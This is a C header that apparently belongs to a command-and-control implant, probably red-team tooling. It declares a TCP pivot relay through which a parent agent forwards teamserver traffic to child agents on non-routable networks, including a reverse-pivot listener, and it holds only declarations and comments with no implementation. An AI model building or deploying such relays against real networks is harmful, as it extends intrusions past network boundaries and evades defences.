#ifndef PIVOT_H
#define PIVOT_H

#include "types.h"
#include "msgpack.h"
#include <stdint.h>

/// TCP pivot relay -- allows parent agent to relay traffic to/from child agents
/// on non-routable networks. Linux-only, TCP transport.
///
/// Flow:
///   1. Teamserver sends COMMAND_LINK(address, port) to parent agent
///   2. Parent connects to child via TCP, reads handshake (4B watermark + beat)
///   3. Parent returns {type, watermark, beat} to teamserver
///   4. Teamserver sends COMMAND_PIVOT_EXEC(pivotId, data) for relay to child
///   5. Parent polls child sockets in process_pivots(), relays data back
///   6. Teamserver sends COMMAND_UNLINK(pivotId) to tear down

#define MAX_PIVOTS  32

/* Connect timeout (seconds) for pivot dials -- shared by pivot.c's forward
   link and main.c's reverse-pivot child bootstrap. */
#define PIVOT_CONNECT_TIMEOUT  10
typedef struct {
    uint32_t id;      /* pivot ID = task ID from COMMAND_LINK */
    int      fd;      /* TCP socket to child agent */
    int      active;  /* 1 = live, 0 = free slot */
} pivot_entry_t;

typedef struct {
    pivot_entry_t entries[MAX_PIVOTS];
    int           count;
    /* Reverse pivot: parent-side listening socket that accepts children
       dialing IN.  -1 = not listening.  Deliberately kept out of `entries`:
       it is not a pivot itself, it produces pivots. */
    int           listen_fd;
    uint16_t      listen_port;
} pivot_context_t;

/// Initialize pivot context
void pivots_init(pivot_context_t *ctx);

/// Link: connect to child agent at address:port, read handshake,
/// store pivot entry. Writes response data to `response`.
/// Returns 0 on success, -1 on error.
int pivot_link_tcp(pivot_context_t *ctx, uint32_t task_id,
                   const char *address, int port,
                   mp_writer_t *response);

/// Dial a TCP peer with a bounded connect timeout.  Returns a blocking
/// connected fd, or -1 (with *err_out pointed at a static reason string).
/// Shared by the forward pivot and the reverse pivot's child-side bootstrap.
int pivot_dial_tcp(const char *address, int port, int timeout_s, const char **err_out);

/// Reverse pivot (listen side): open a listening socket on `port` and accept
/// children that dial IN.  Non-blocking -- the accept itself happens inside
/// process_pivots(), so the agent's command loop is never stalled.
/// Children are adopted with the same handshake path as pivot_link_tcp() and
/// announced to the teamserver as an asynchronous COMMAND_LINK object.
/// port == 0 closes an existing listener instead.
/// Returns 0 on success, -1 on error.
int pivot_listen_tcp(pivot_context_t *ctx, int port, mp_writer_t *response);

/// Unlink: close a pivot by ID. Writes response to `response`.
/// Returns 0 on success, -1 if not found.
int pivot_unlink(pivot_context_t *ctx, uint32_t pivot_id,
                 mp_writer_t *response);

/// Write data to a pivot's child agent (relay from teamserver).
/// Used for COMMAND_PIVOT_EXEC from server→child direction.
int pivot_write(pivot_context_t *ctx, uint32_t pivot_id,
                const uint8_t *data, uint32_t data_len);

/// Poll all active pivots for incoming data from child agents.
/// Appends relay response objects to `objects_writer` (msgpack array context).
/// Returns the number of pivot data objects appended.
int process_pivots(pivot_context_t *ctx, mp_writer_t *objects_writer);

/// Global pivot context (defined in pivot.c)
extern pivot_context_t g_pivot_ctx;

#endif /* PIVOT_H */
